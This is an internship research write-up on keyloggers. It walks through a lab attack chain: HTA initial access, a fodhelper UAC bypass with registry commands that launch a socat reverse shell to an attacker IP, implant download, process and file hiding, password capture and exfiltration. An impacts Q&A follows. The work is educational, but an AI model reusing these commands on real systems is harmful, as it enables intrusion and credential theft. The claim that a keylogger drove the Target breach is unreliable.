---
title: Internship Research Project, Keylogging - How it Works and its Impacts
date: 2023-05-26 12:00:00 -500
categories: [Malware, Research Project]
tags: [TechCareers]
---

----------------------

# Introduction

Keylogging, often considered a type of cyber threat, is the practice of recording the keys struck on a keyboard, typically covertly, so that a person using the keyboard is unaware that their actions are being monitored. This report aims to discuss the technical aspects of keylogging, its potential effects, and the associated countermeasures. It is critical to note that this information is to be used for ethical and educational purposes only, such as cybersecurity research and the development of protective measures.

**Note: Target is normal user NOT a pentester/security folks**.

# Related Works (Literature Review)

- Sektor7 - `(Setup)`

		- Evasion course source code (some of it) - Userland rootkit part

				- Process Info Hiding - Hide the process from process like Task Manager, Process Hacker ,etc.

				- Hiding files

				- etc.

		- Intermediate course source code (some of it) - Hooking Concepts

- **R77Rookit** (Userland) - `https://github.com/bytecode77/r77-rootkit`

- Spyware and Adware book - `(Reference)`

- THM Weaponization Room (HTA) - `(Setup)`

- Windows API Documentation - `(Docs)`

- ChatGPT-4 : `(Docs)`

- SecureList: Implementing Keyloggers in WindowsOS part 1 and 2  - **(Main)**


------------------

# Research / Project Core

**Presumptions**:

- There are no active defensive solutions in the target machine. This was meant to showcase the capabilities of a Keylogger instead of focusing on purely Evasion.

- All other subprocesses in the chain are meant to complement the **Keylogging** capabilities of the malware instead of outshining them.

### **Attack Chain**

![](/assets/img/Pasted image 20230521175903.png)

![](/assets/img/Pasted image 20230521175939.png)

## Malware Flow of Attack

![](/assets/img/Pasted image 20230521180019.png)



### Creating a Setup which allows the Keylogger to Operate

- Situation in which a victim has been infected by a **malware** via a **Dropper** after a ***`Social Engineering`*** attack.

- The malware's context in the system like:

		- How are they able to hide from the user? (Evasion - Userland Rootkit capabilities?)

		- How can they continually record keystrokes of the victim?

		- What can attackers do to exfiltrate the recorded data of the victim? (TCP Socket Exfil)

- **Note: All other concepts needed for the setup are simple variation of them and the focus is mainly on `Keylogging` part.**


### Keylogging - How It Works

- Reference: `https://securelist.com/keyloggers-implementing-keyloggers-in-windows-part-two/36358/`

##### What are included:

<u>Requirements</u>:

- Kali Linux

- Windows Victim machine

- Windows Keylogger Testing machine

- Text-based Demonstration (Proof-Of-Concept `[Walkthrough]`)

**Note: The keylogger created is sent to VirusTotal to get signatured**:

<u>First Submission</u>:

![](/assets/img/Pasted image 20230521192434.png)

		- Is password protected: "infected"

- Link: https://www.virustotal.com/gui/file/67295f4d076ca569833b0524c8d0ffe6516c4075eda74ef39705b3a9335f6ee1/details 

- MD5 : 03343e15f7696bf29819317c7dfe6c02 

- SHA-1 : 9ca9ec22cd2ecdcf805abb5dd414dfe315d9baa4 

- SHA-256 : 67295f4d076ca569833b0524c8d0ffe6516c4075eda74ef39705b3a9335f6ee1 

- Vhash : none
	
- SSDEEP : 1536:mhjQ+zpxfMi4MrDsNriiwHpSc84mDZzlniQv0bZNy0QV17eFlqBWAfX:6jQ2xfMi4FNrSscbmDZzQO0VUX7CFlqH 

- TLSH : T1D093129F613999DB61BDD31ECD8478F1B3828054AD25DBC46803DF7E0B8B6D64B20928 

- File Type : 7ZIP 

- Magic : 7-zip archive data, version 0.4 

- TrID : 7-Zip compressed archive (v0.4) (57.1%)   7-Zip compressed archive (gen) (42.8%) 

- File Size : 88.74 KB (90867 bytes) 


<u>Second Submission</u>:

![](/assets/img/Pasted image 20230521195026.png)

	- Is NOT password protected
	
		- Demonstration (3):

		1. Keylogging in Veracrypt creds [/]

		2. Keylogging in Password Manager - KeePassXC [/]

- Link: https://www.virustotal.com/gui/file/4f77e04b2ab2e510e9c40e9977179768adbd68167c169d0ca994674bac01956b?nocache=1 

- MD5 : c2bfb831fb20bd655cb54108d2cba07f 

- SHA-1 : 469f8d37ee5a3171d8c76e79ec80b6491d665118 

- SHA-256 : 4f77e04b2ab2e510e9c40e9977179768adbd68167c169d0ca994674bac01956b 

- Vhash : b06d920b5f3cccbbdaef42ea8aa8b6a8 

- SSDEEP : 3072:lFJbJAeCQ5jiL/LWqu+uZJZ2BdXXrjwyuO/uobpybWS8xcvASGa6IxE+:Vir0jGuZJAnrjHukuF63xoAxIxD 

- TLSH : T15FE31291824421C3F0F9B6BAB2ED7A64CB8CDCC35170E2D4F855157ACBF21E729E2856 

- File Type : ZIP 

- Magic : Zip archive data, at least v2.0 to extract, compression method=store 

- File Size : 151.49 KB (155127 bytes)


##### Contents: "implant.dll" and "implant.exe"

- "implant.exe" : VirusTotal Link https://www.virustotal.com/gui/file/cae8cb8ec02c73e4c12f3547cde252f055ef7ad2ed787d101f613ed402022d1f 

- "implant.dll" : VirusTotal Link https://www.virustotal.com/gui/file/50a6b0c56d3e4da62e4f9cb27392d1b1d0e386c09a48bb05c897541e3e19cdfb 


**Situational Context**:

- User `noob` received an email from a rogue IT email account that states to execute an `HTML Application` file attached in the email via ***powershell***. This was prompted because user `noob` had previously asked the same IT person for help on its HTML webpages. The user `noob` unsuspectingly executes the file in powershell that grants the attacker a foothold on the victim's computer.


##### Initial Access - uses HTA (follow THM's tutorial!)

```
Plan for now:
Initial Access via HTA (gets triggered using PowerShell) -> Reverse shell connection + Persistence (low priv) -> Download "implant.exe" to victim + Execute -> Privilege Escalation using user:password credentials via RDP on UAC Bypass [Hi Priv Escalation] OR PsExec64.exe  -> Evasion: Hook for Process Creation + Rootkit tech -> Payload(MessageBox) == Hook for keyboard events + Capture keystrokes -> Saved log to a file -> Data Exfiltration using python uploader
```

	- How can the HTA get executed via PowerShell in the first place?

			- Social Engineering! Victims are meant to be tricked into executing it in PowerShell. (I guess depending on the context as well)


### Malicious HTA Via Metasploit

- Another way of generating and serving malicious files: via `Metasploit Framework`

- Section: `exploit/windows/misc/hta_server`

<u>Setup of this exploit from the Attacker's perspective</u>:

![](/assets/img/Pasted image 20230521182252.png)

![](/assets/img/Pasted image 20221226193449.png)

- Attacker listening:

![](/assets/img/Pasted image 20230521182319.png)

		- Notice that in the Metasploit framework, we can easily modify both the payload and the listener for the initial access to connect back on.

<u>Victim's POV</u>:

![](/assets/img/Pasted image 20230521182411.png)

- Now, for the execution:

![](/assets/img/Pasted image 20230521182523.png)

<u>Attacker's POV cont'd</u>:

![](/assets/img/Pasted image 20230521182548.png)

	- Payload delivered successfully.

- After the payload has been executed on the victim's machine:

![](/assets/img/Pasted image 20230521182621.png)

- Note that the ***Initial Access*** exploit was executed using `powershell.exe` process. In this case, it will show in Task Manager (or Process Hacker) the process running the reverse shell:

![](/assets/img/Pasted image 20230520182237.png)


***Another situational context:*** user `noob`'s password is lying around in the system encoded with `base64`.

- After gaining a reverse shell from the HTA Initial Access attack, attackers can see that a base64 encoded string is lying around in a folder on the Desktop directory:

![](/assets/img/Pasted image 20230521174252.png)

<u>Decoding it</u>:

![](/assets/img/Pasted image 20230521174722.png)

- **Question**: In what situation(s) can we use this credential?

--------------------------------

## **Privilege Escalation Technique to use**:

- `UAC Bypass via Fodhelper.exe`

		- This is chained with RDP access using the credentials "noob:password" acquired prior.

### **Privilege Escalation via UAC Bypass - `fodhelper.exe` + RDP with `user:pass` combo** :

```
1. Creating a reverse shell listener on the attacker machine: "nc -lvnp <attacker-ip>"
```

![](/assets/img/Pasted image 20230521184743.png)

```
2. Check the privilege of the current user you have on the Initial Access: "net user <attacker> | find 'Local Group'"
```

![](/assets/img/Pasted image 20230521184715.png)

	- The user 'noob' is a member of the Administrators group but we don't have a high privilege shell because of the UAC mechanism.

```
3. Modifying the Registry to manipulate certain registry key used by "fodhelper.exe" service to execute a reverse shell: (Execute it with the Initial access Shell)
		C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
		C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.10.102.75:4444 EXEC:cmd.exe,pipes"
		
		C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
		The operation completed successfully.
		
		C:\> reg add %REG_KEY% /d %CMD% /f
		The operation completed successfully.
```

**Note**: Changing the Registry key and values `requires` local administrative privileges in which remote connection from user `noob` don't have even if it is a member of the Administrators group. This requires RDP session login.

<u>Preparation</u>:

- Setup the text file to be copied online:

![](/assets/img/Pasted image 20230521185626.png)

- Setup the site to download/copy this from:

![](/assets/img/Pasted image 20230521185647.png)


##### RDP Session using credentials `noob:password`

- Logging in:

![](/assets/img/Pasted image 20230521185008.png)

	- Note that doing this logs out the user 'noob' on their session so we want to modify the registry value and execute fodhelper.exe quickly.

- Checking the commands to execute to modify the Registry `fodhelper.exe` use when it gets executed:

![](/assets/img/Pasted image 20230521190011.png)

- Execution:

![](/assets/img/Pasted image 20230521190059.png)

<u>Before the execution of these commands</u>:

![](/assets/img/Pasted image 20230119224404.png)


<u>After the execution of the commands</u>:

- "`DelegateExecute`" is empty and the "`Default`" has the value of `socat` to connect back to the reverse shell listener.
![](/assets/img/Pasted image 20230119232554.png)


##### Modifying Execute `fodhelper.exe` using `RDP`:

- Note that on more updated versions of Windows, `fodhelper.exe` is NOT visible from the remote connection.

![](/assets/img/Pasted image 20230520161643.png)

<u>Bypassing UAC</u>:

```powershell
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Users\noob\Desktop\socat-1.7.3.2-1-i686\socat-1.7.3.2-1-i686\socat.exe TCP:12.0.0.5:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
```

- Reference : `"Bypassing UAC" TryHackMe notes`

- Then, execute `C:\Windows\System32\fodhelper.exe`

		- This is one of the important part since this seems to be invisible from remote connections when enumerating at C:\Windows\System32.

![](/assets/img/Pasted image 20230521190229.png)

**Note: `fodhelper.exe` is NOT visible from the remote connection of the Initial Access. There must be some defense mechanism that makes it impossible to see this executable from a reverse shell connection(remote)**.

![](/assets/img/Pasted image 20230521190453.png)

	- No fodhelper.exe

**Assumption**: `RDP is enabled to begin with but the Attacker with Initial Access has done the Enumeration part of course.`

- Since we are using a reverse shell connection from Metasploit, the Initial Access from the `.hta` file, we will use a ***PowerShell scripting***:

<u>PowerShell Script</u>:

```powershell
if ((Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { "RDP is enabled" } else { "RDP is disabled" }
```

<u>Output</u>:

![](/assets/img/Pasted image 20230526113655.png)

	- Just imagine this executed on Metasploit since that is where we should execute this script.

<u>Registry Editor</u>:

![](/assets/img/Pasted image 20230526113807.png)

- **ChatGPT** Explanation:

```
This command does the same thing as the function in the previous script. It checks the value of the `fDenyTSConnections` registry key. If it's 0, it means RDP is enabled, and the command prints "RDP is enabled". If it's not 0, it means RDP is disabled, and the command prints "RDP is disabled".
```

<u>Checking the RDP once you have RDP session</u>:

![](/assets/img/Pasted image 20230520151223.png)


##### Checking the privilege of the user `noob`:

![](/assets/img/Pasted image 20230521190555.png)

	- UAC has been completely bypassed!


----------------------------------

## Evasion Gameplan - `Userland-based Rookit Tech`: 

- Note that Evasion are more effective if the implant has higher privilege.

- **Hiding Process** `->` Make sure that the `implant.exe` has a local admin privileges.

##### Download "implant.exe" to victim + Execute

**Downloading the implant**:

- The `.zip` file was downloaded using **wget** with the Initial Access from `HTA` attack.

**Executing the Implant**:

<u>Attacker's Perspective</u>:

![](/assets/img/Pasted image 20230521183057.png)

- Executing the `implant.exe`:

![](/assets/img/Pasted image 20230521183244.png)


<u>User noob's Perspective</u>:

- If there was no `process hiding` by the rootkit:

![](/assets/img/Pasted image 20230521183437.png)

	- It will show the process of the dropper.

- Once the malicious DLL gets injected on all of the Desktop app processes:

![](/assets/img/Pasted image 20230521190752.png)

	- The `implant.exe` process disappeared and the MessageBox payload appears to which shows that the implant.dll got injected on all processes.

	- In this case, the trigger is keyboard events on the alive processes.


-----------------

## Keylogging Capabilities

- Checking the `output.txt` to which the keystrokes are being logged:

![](/assets/img/Pasted image 20230521191035.png)

	- Notice that it shows the Date and Time plus the Window to which the user was interacting with.

	- It also shows the specific keys the user typed in and the commands used in this example when the user typed in the commands:

			- whoami

			- pwd

	- in the Windows Powershell.


##### Case 1: Capturing credentials entered on Veracrypt.exe process 

- Mounting the file `storage` on **Veracrypt**:

![](/assets/img/Pasted image 20230521195740.png)

<u>Result</u>:

![](/assets/img/Pasted image 20230521195801.png)

<u>Capture Keystroke</u>:

![](/assets/img/Pasted image 20230521200059.png)

	- Although the capture keystrokes has added weird 'u' character, it shows that the keystroke is being captured by an attacker.

	- The correct password is: "ResearchProject123!"


##### Case 2: Capturing credentials entered on `KeePassXC`

- Simulating user `noob` entering its master password on its Password Manager:

![](/assets/img/Pasted image 20230521200421.png)

- Checking the entries inside and getting the flag:

![](/assets/img/Pasted image 20230521200452.png)

![](/assets/img/Pasted image 20230521200512.png)

	- Flag: flag{s3cr3t_l33t_stuff}

- Checking the keystrokes from the `output.txt`:

![](/assets/img/Pasted image 20230521200721.png)

	- Password caught by the Keylogger!


##### **Hiding** the `..\\secret\\output.txt` where to the data to be exfiltrated are in. 

- `->` Make sure that the implant has the HIGH / MANDATORY privilege when typed in "`whoami /groups`" at the end. Otherwise it won't work. `[/]`

- Note that although the "`..\\secret\\`" folder's contents is hidden to the user (GUI), with the reverse shell from the HTA Initial Access, we can exfiltrate the `\\secret\\output.txt` file from this reverse shell connection.

- The file to be exfiltrated is in the directory: `C:\Users\noob\Downloads\secret`.

![](/assets/img/Pasted image 20230521191241.png)

	- We don't want this to be visible to the user noob when it is browsing normally in the local machine.

- Making sure that the malicious DLL got injected into the `explorer.exe`:

![](/assets/img/Pasted image 20230521191428.png)

- Notice that the files inside are gone!

![](/assets/img/Pasted image 20230521191448.png)

	- The victim will have their data recorded without them knowing , atleast via GUI.


### **Data Exfiltration using `Python Uploader`:**

- Use python's `UploadServer` module to sent `output.txt` from victim to attacker's machine.

![](/assets/img/Pasted image 20230519153037.png)

<u>Result</u>:

![](/assets/img/Pasted image 20230520152653.png)


![](/assets/img/Pasted image 20230520152725.png)


<u>Contents of the logged keystrokes per Window</u>

![](/assets/img/Pasted image 20230520152821.png)

	- Now we can see what the unsuspecting victim's Desktop apps its been using.
	- It also contains both the Date and Time of the event.


----------------------

# Keylogging Impacts

- **Case Studies**: `https://securelist.com/keyloggers-how-they-work-and-how-to-detect-them-part-1/36138/`

- From Sociology 201 : Concept of `Back Stage VS Front Stage`

**Front Stage**:
```
- The front stage is the place where the performance is given to an audience, including the fixed sign-equipment or setting that supports the performance (the raised podium of the judge’s bench, the family photos of the living room, the bookshelves of the professor’s office, etc.). 

- On the front stage the performer puts on a personal front (or face), which includes elements of appearance–uniforms, insignia, clothing, hairstyle, gender or racial characteristics, body weight, posture, etc.–that convey their claim to status, and elements of manner–aggressiveness or passivity, seriousness or joviality, politeness or informality–that foreshadow how they plan to play their role. 

- The front stage is where the performer is on display and they are therefore constrained to maintain expressive control as a single note off key can  
disrupt the tone of an entire performance. 

- A waitress for example needs to read the situation table by table in walking the tricky line between establishing clear, firm, professional boundaries with the paying clients, (who are generally of higher status than her), while also being friendly, courteous and informal so that tips will be forthcoming.
```

**Back Stage**:

- The back stage is generally out of the public eye, the place where the front stage performance is prepared. 

- It is the place where “the impression fostered by the performance is knowingly contradicted as a matter of course” (Goffman, 1959). 

- The waitress retreats to the kitchen to complain about the customers, the date retreats to the washroom to reassemble crucial make-up or hair details, the lawyer goes to the reference room to look up a matter of law she is not sure about, the neat and proper clerk goes out in the street to have a cigarette, etc. 

- The back stage regions are where props are stored, costumes adjusted and examined for flaws, roles rehearsed and ceremonial equipment hidden–like the good bottle of scotch–so the audience cannot see how their treatment differs from others. 

- As Goffman says, back stage is where the performer goes to drop the performance and be themselves temporarily: “Here the performer can relax; he can drop his front, forgo speaking his lines, and step out of character” (Goffman, 1959)



		- Connection to Keylogging: Since keylogging leads to Data Breach, the curtain that separates the Back Stage of yourself and the Front Stage is essentially removed. What does it lead to?
				- Extortion
				- Harassment
				- Shaming
				- Psychological Torture
				- Extreme Vulnerability
				- Microaggressions
				- Physical Harm

- **Note: Give one case for each.**

		- Counter to Cybersecurity Attack: Better defense? (Costly and needs so much resources - Cybersecurity is a numbers game and those numbers are money,time,people and effort)
		- Counter to the Impact: ???
		- Note that for the cases of Data Breach, it is already out there. The question is, how can victims deal with the impact from this point onwards?


---------------
# Reporting / Discussion

### Setup to allow keylogging to occur


- How does a victim gets compromised to begin with? 

    Ans: A victim may get compromised via Phishing attempts from either a cold email source or most likely through a Business Compromise Email attacks since this leverages trust between the sender and the receiver of the email. With this, the attacker can send an attachment from the email of the trusted person of the victim and instruct them specific computer operations to execute the attachment leading to an Initial Access. From here, the attacker can then, download a keylogger to the victim’s system, capturing its keystrokes. 
 

- What can attackers do to hide the fact that the victim has a keylogger (software) on their system? 

    Ans: Attackers can use rootkit capabilities and depending on the computer skill of the intended victim. If the victim is a normal computer user, Userland Rootkit Capabilities would normally work. However, for a Penetration Tester or a Security Researcher, attackers will definitely use Kernel Land Rootkit Capabilities as these are stealthier techniques. 
 

- What techniques attacker can use to continually record victim's keystrokes? 

    Ans: Attacker use persistence techniques such that when the victim ever turns off the computer and effectively kills the keylogger malware and its connection back to the Attacker’s machine(s), the victim’s machine will connect back or the Keylogger malware instantly executes once the victim user has logged into their computer. 


- What techniques attacker can use to exfiltrate the data recorded from the victim? 

    Ans: In the wild, Attackers use C2 communications to extract the keystroke of the victim as this is stealthier way of data exfiltration. In the case study above, I only used Python Module to show the concept and the possibility. 


### Understanding Keylogging

- What is keylogging and what are its primary uses?

    Ans: Keylogging is the act of capturing data input coming from the user using the peripherals the users use to interact with their computers. 

 
- How does a keylogger work? Can you explain the basic principles? 

    Ans: A keylogger work in a way that a computer program or hardware captures the keystroke signals coming from the keyboard’s microcontroller when a user pressed a key. When this signal gets to the motherboard’s microcontroller to be processed and outputted into the computer’s screen, the keylogger has created its own copy of the signal after the motherboard’s microcontroller has processed it and save it on a file. 
 

- What are the different types of keyloggers and how do they differ in operation? 

    Ans: There are two types of keyloggers: Hardware and Software. A Hardware keylogger, most of the times implemented on a USB drive, will capture the victim’s keystroke and the USB is to be retrieved after assuming the victim hasn’t noticed that there was a keylogger in place. This presumes the attacker’s skill in Social Engineering and Physical Pentesting. A Software Keylogger on the other hand is normally embedded in a Malware such that the malware’s impact is mainly keylogging. Think of Malware as an Onion and the “keylogging” capability of the malware is the innermost layer of an onion. Both types essentially have the same capabilities but differ in the way they are deployed. One is deployed through mix of physical and digital means while the other is purely digital. 
 

- Can keyloggers affect both hardware and software? How? 

    Ans: Yes. Essentially, Keyloggers are “Software-In-The-Middle" as it captures and create a copy of the signal after being processed by the motherboard’s controller originally coming from the keyboard’s controller. 



### Impact of Keylogging

Credit: Project Partner

- What kind of data can keyloggers potentially expose? (VeraCrypt creds, Website account credentials, etc.) 

Keyloggers have the potential to expose various types of sensitive data, depending on the activities being monitored. Some examples include: 

    a) Credentials: Keyloggers can capture usernames, passwords, and other login details for various accounts, such as email, social media, banking, and online shopping websites. 

    b) Financial Information: Keyloggers can record credit card numbers, banking details, and financial transaction information, enabling unauthorized access to sensitive financial accounts. 

    c) Personal Identifiable Information (PII): Keyloggers may expose personally identifiable information like full names, addresses, phone numbers, social security numbers, and other private details, which can be used for identity theft. 

    d) Communication: Keyloggers can intercept and capture messages, emails, chats, and other forms of electronic communication, potentially exposing confidential conversations or sensitive information. 

    e) Keystrokes and System Activity: Keyloggers can record all keystrokes made on a compromised system, including commands, searches, and file names, giving the attacker visibility into the victim's activities and potential access to confidential files. 

 

- Can you share some real-life incidents where keyloggers have caused significant harm? 

There have been several notable real-life incidents where keyloggers have caused significant harm: 

    a) Zeus Banking Trojan: The Zeus malware, which included keylogging capabilities, was responsible for numerous financial crimes, stealing millions of dollars from banking customers worldwide. 

    b) Carbanak APT: The Carbanak Advanced Persistent Threat (APT) group used keyloggers to compromise financial institutions, gaining access to banking systems and orchestrating large-scale thefts, resulting in losses amounting to hundreds of millions of dollars. 

    c) Target Data Breach: In 2013, a keylogger was used to compromise the point-of-sale systems of the Target retail chain, resulting in the theft of over 40 million credit card details and personal information of approximately 70 million customers. 

    d) DarkHotel: The DarkHotel espionage group employed keyloggers to target high-profile individuals, such as government officials and corporate executives, in luxury hotels. The keyloggers were used to steal sensitive information and conduct further cyber-espionage activities. 

 

- How can keyloggers contribute to identity theft? 

Keyloggers play a significant role in facilitating identity theft by capturing sensitive information needed to impersonate individuals. By logging keystrokes, they can gather login credentials, personal information, and financial details necessary for fraudulent activities. Once the attacker gains access to this information, they can assume the victim's identity, open fraudulent accounts, make unauthorized transactions, or engage in other forms of malicious behavior that can severely impact the victim's finances, credit score, and overall reputation. 

 

- What are the potential financial implications of a keylogging attack? 

Keylogging attacks can have severe financial implications for both individuals and organizations. Some potential consequences include: 

    a) Financial Losses: Attackers can use keyloggers to obtain login credentials for online banking accounts, credit card details, and other financial information, leading to unauthorized transactions, fraudulent purchases, and drained bank accounts. 

    b) Identity Theft: Keyloggers can expose personal information required for identity theft, allowing attackers to open new credit accounts, apply for loans, or engage in other fraudulent activities in the victim's name. 

    c) Legal Costs: Victims may incur expenses related to legal counsel, identity theft protection services, and potential lawsuits against financial institutions or organizations responsible for data breaches. 

    d) Damage to Credit Score: If attackers misuse the captured information to default on payments or engage in other fraudulent activities, the victim's credit score can be negatively affected, making it challenging to obtain credit in the future. 

    e) Reputational Damage: Financial losses and identity theft resulting from keylogging attacks can harm an individual's or organization's reputation, leading to diminished trust from customers, partners, and stakeholders. 


- How can the data captured by keyloggers be used for malicious purposes? 

Data captured by keyloggers can be used for various malicious purposes, including: 

    a) Unauthorized Access: Attackers can use captured login credentials to gain unauthorized access to online accounts, email, social media, or corporate networks, potentially exposing sensitive information or launching further attacks. 

    b) Financial Fraud: Keyloggers can facilitate financial fraud by providing attackers with credit card details, online banking credentials, or other financial information necessary to conduct unauthorized transactions, make purchases, or drain bank accounts. 

    c) Identity Theft: The data captured by keyloggers, such as personally identifiable information (PII), can be exploited to impersonate individuals, open fraudulent accounts, apply for loans, or conduct other activities that can lead to identity theft. 

    d) Espionage: Keyloggers can be used for espionage purposes, capturing confidential information, trade secrets, intellectual property, or sensitive communications in targeted organizations or government entities. 

    e) Blackmail or Extortion: Attackers can exploit the captured data to blackmail victims by threatening to expose sensitive or embarrassing information unless a ransom is paid. 

 
- What is the potential impact of keylogging on individual privacy? 

Keylogging poses a severe threat to individual privacy as it compromises the confidentiality of personal and sensitive information. The intrusion into an individual's keystrokes and online activities can expose their private conversations, browsing habits, financial transactions, and other personal details. This violation of privacy can lead to emotional distress, loss of trust, and potential reputational damage if the captured information is misused or exposed. 

 

- Can keylogging lead to corporate espionage? How can it impact businesses? 

Yes, keylogging can be a tool for corporate espionage. By deploying keyloggers on employee devices or infiltrating corporate networks, malicious actors can intercept sensitive information, trade secrets, intellectual property, or confidential communications. This can have significant impacts on businesses, including: 

    a) Loss of Competitive Advantage: Competitors or threat actors can use the captured information to gain insights into a company's strategies, product plans, financial data, or upcoming business deals, eroding the organization's competitive advantage. 

    b) Intellectual Property Theft: Keyloggers can enable the theft of valuable intellectual property, such as proprietary software code, designs, patents, or research and development data, which can undermine a company's innovation and profitability. 

    c) Damage to Reputation: A keylogging attack that compromises sensitive customer data or confidential business information can damage a company's reputation and erode trust among customers, partners, and stakeholders. 

    d) Financial Losses: Corporate espionage through keyloggers can result in financial losses due to stolen trade secrets, disrupted business operations, legal battles, remediation costs, and potential lawsuits from affected parties. 

 

- How does keylogging affect the overall cybersecurity landscape? 

Keylogging significantly impacts the cybersecurity landscape in several ways: 

    a) Evading Traditional Security Measures: Keyloggers can bypass traditional security measures such as firewalls and antivirus software since they often operate at the user level, capturing keystrokes directly from input devices before encryption or transmission. 

    b) Exploiting Human Vulnerabilities: Keyloggers take advantage of human behavior and vulnerabilities, relying on users inadvertently providing sensitive information. This highlights the importance of user awareness and education as part of comprehensive cybersecurity strategies. 

    c) Enabling Other Attacks: Keyloggers can serve as a stepping stone for further attacks, as they provide attackers with valuable insights into the victim's activities, credentials, and potential avenues for exploitation. 

    d) Sophistication and Availability: Keyloggers have become more sophisticated over time, employing advanced techniques to evade detection. Moreover, they are increasingly available in underground markets, making them accessible to a broader range of threat actors. 

    e) Detection and Prevention Challenges: Detecting keyloggers can be challenging since they can operate stealthily, disguising their presence or masquerading as legitimate software. Effective prevention requires a multi-layered approach, including robust endpoint security, behavior monitoring, and user awareness training. 



- What are the potential psychological impacts on victims of keylogging attacks? 

Keylogging attacks can have significant psychological impacts on their victims, including: 

    a) Invasion of Privacy: The knowledge that someone has gained unauthorized access to personal conversations, activities, or sensitive information can create feelings of violation and loss of privacy, leading to anxiety and stress. 

    b) Emotional Distress: Victims may experience heightened emotional distress, fear, or paranoia, knowing that their personal information is in the hands of an attacker. This can affect their overall well-being, relationships, and trust in digital systems. 

    c) Financial Anxiety: If financial information is compromised, victims may experience financial anxiety, worrying about potential fraudulent transactions, credit damage, or the long-term consequences of identity theft. 

    d) Loss of Trust: Keylogging attacks can erode trust in digital systems, online communication, and the security of personal information, making victims more cautious and skeptical about sharing sensitive data in the future. 

    e) Social Stigma: Depending on the nature of the compromised information, victims may face social stigma or embarrassment if their personal conversations, online activities, or browsing habits are exposed. 

 
- What's the potential fallout of a keylogging attack on a government's infrastructure? 

A keylogging attack on a government's infrastructure can have severe consequences: 

    a) National Security Risks: Government agencies often handle classified or sensitive information related to national security. Keyloggers can expose confidential communications, intelligence operations, defense strategies, or critical infrastructure vulnerabilities, potentially jeopardizing national security. 

    b) Espionage and Cyber Warfare: Keyloggers can be used by foreign adversaries or malicious actors to conduct espionage activities, infiltrating government systems and stealing classified information for political, military, or economic advantage. 

    c) Compromised Governance: If keyloggers infiltrate government systems, they can compromise the integrity and confidentiality of government operations, impacting decision-making, policy formulation, and public trust in the government's ability to protect sensitive information. 

    d) Public Safety Risks: Keylogging attacks on critical infrastructure, such as transportation systems, power grids, or emergency services, can disrupt essential services, compromise public safety, and lead to economic damage or potential physical harm to citizens. 

    e) Diplomatic Consequences: If a keylogging attack on a government's infrastructure is attributed to a foreign state, it can strain diplomatic relationships, lead to diplomatic repercussions, or escalate tensions between nations. 

 

- Can keylogging affect the trust in digital systems and online transactions? How? 

Yes, keylogging attacks can significantly impact trust in digital systems and online transactions. When users become aware of the potential presence of keyloggers, they may develop skepticism and doubt about the security of digital platforms. This can result in the following consequences: 

    a) Reduced Confidence: Keyloggers can erode user confidence in online systems, including e-commerce platforms, online banking, or cloud services, making users hesitant to share sensitive information or engage in online transactions. 

    b) User Abandonment: If users perceive digital systems as insecure, they may abandon or limit their use of certain platforms or online services, hindering the growth of e-commerce and digital transformation efforts. 

    c) Economic Impacts: The loss of user trust can have economic consequences, affecting online businesses and industries that rely on user engagement, transactions, and data sharing. Reduced trust may result in decreased customer retention, lower conversion rates, and financial losses for businesses. 

    d) Regulatory Responses: High-profile keylogging incidents can trigger regulatory scrutiny and the implementation of stricter data protection measures, potentially leading to increased compliance requirements and costs for businesses. 

 

- How does keylogging impact the work of IT departments in businesses? 

Keylogging incidents can significantly impact the work of IT departments in businesses in the following ways: 

    a) Detection and Incident Response: IT departments are responsible for detecting keylogging attacks, monitoring systems for signs of compromise, and promptly responding to incidents to mitigate potential damage. 

    b) Security Infrastructure: IT departments must implement robust security measures, including endpoint protection, intrusion detection systems, and employee awareness programs, to prevent keylogging attacks and protect sensitive data. 

    c) User Training and Education: IT departments play a crucial role in educating employees about the risks of keyloggers and promoting secure practices such as strong passwords, two-factor authentication, and regular software updates. 

    d) Forensic Investigation: In the event of a keylogging attack, IT departments may be involved in forensic investigations to identify the source of the attack, assess the scope of the breach, and implement measures to prevent future incidents. 

    e) Security Policies and Procedures: IT departments develop and enforce security policies, access controls, and incident response plans to address keylogging threats and maintain the overall security posture of the organization. 

 
- What could be the potential social consequences if keylogging techniques become more widespread and easy to use? 

If keylogging techniques become more widespread and easy to use, several potential social consequences may arise: 

    a) Erosion of Trust: Widespread availability and use of keyloggers can erode trust in digital systems, online communication, and the security of personal information, leading to increased skepticism and caution when engaging in online activities. 

    b) Privacy Concerns: Heightened awareness of keyloggers may lead individuals to question the privacy and security of their digital interactions, potentially resulting in self-censorship, reduced online engagement, or a shift towards offline communication. 

    c) Stifled Expression and Creativity: Fear of keyloggers may limit free expression and creativity, as individuals may hesitate to share their thoughts, ideas, or opinions online for fear of interception or exposure. 

    d) Impact on Digital Economy: A decline in user trust due to widespread keylogging could negatively impact the growth of the digital economy, hindering e-commerce, digital services, and technological innovation. 

    e) Increased Demand for Privacy-enhancing Technologies: A rise in keylogging incidents could drive increased demand for privacy-enhancing technologies, secure communication tools, encryption solutions, and other measures to protect sensitive information. 

 

- How can keylogging contribute to the spread of misinformation or fake news? 

Keylogging can indirectly contribute to the spread of misinformation or fake news by compromising user accounts and allowing attackers to impersonate individuals or gain unauthorized access to social media platforms. Once attackers have control over compromised accounts, they can manipulate or fabricate information, post misleading content, or spread false narratives under the guise of legitimate users. This can amplify the dissemination of misinformation, as it appears to come from trusted sources, potentially leading to confusion, distrust, and the rapid spread of false information within online communities. 

 
- What is the potential impact of keylogging on online communities and social networks? 

Keylogging can have significant impacts on online communities and social networks: 

    a) Compromised Accounts: Keylogging attacks can result in the compromise of user accounts within online communities and social networks. This can lead to unauthorized access, hijacking of accounts, and impersonation of legitimate users, potentially damaging trust and the overall community dynamic. 

    b) Spreading Malicious Content: Attackers with access to compromised accounts can use them to spread malicious content, such as spam, malware, or false information, affecting the overall quality and reliability of information within the community. 

    c) Trust and Engagement: Keylogging incidents can erode trust within online communities and social networks. Users may become skeptical about the security of their accounts and interactions, leading to decreased engagement, reluctance to share personal information, or even abandonment of the platform altogether. 

